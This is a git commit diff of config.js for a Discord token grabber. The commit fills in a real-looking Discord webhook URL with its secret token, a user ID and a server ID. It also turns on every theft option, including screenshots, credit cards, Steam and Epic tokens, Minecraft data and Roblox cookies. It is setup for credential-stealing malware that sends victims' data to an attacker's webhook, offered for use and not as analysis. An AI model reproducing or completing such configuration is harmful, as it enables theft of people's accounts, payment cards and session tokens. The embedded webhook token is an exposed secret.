83b33beb78b2504ac79d40c0573b65bc1690251b
xLxstRx <113481012+xLxstRx@users.noreply.github.com>
2022-09-22 12:31:38 +1000

    Updated CONFIG.JS file

--- config.js
+++ config.js
@@ -1,9 +1,9 @@
 {
     // discord token grabber settings
 
-    "webhook": "WEBHOOK HERE",
-    "discord_id": "ENTER YOUR DISCORD ID",
-    "server_id": "ENTER YOUR SERVER ID",
+    "webhook": "https://discord.com/api/webhooks/1019576679796047973/x7DqFIYyu8MnyipsZNJkv_5ZNHH3520T1y6ZN0fhbCx_-_jGVYEoHN84l4OlJv0e73aD",
+    "discord_id": "556046981437325314",
+    "server_id": "944793452518989864",
 
    // you can change this if you have your own!
 
@@ -11,11 +11,11 @@
 
  // set to "true" and "false" only!
 
-    "grab_system": "false", 
-    "grab_screenhot": "false",
-    "grab_creditcard": "false",
-    "grab_steamtoken": "false",
-    "grab_epictoken": "false",
-    "grab_minecraft": "false",
-    "grab_robloxcookie": "false",
+    "grab_system": "true", 
+    "grab_screenhot": "true",
+    "grab_creditcard": "true",
+    "grab_steamtoken": "true",
+    "grab_epictoken": "true",
+    "grab_minecraft": "true",
+    "grab_robloxcookie": "true",
 }
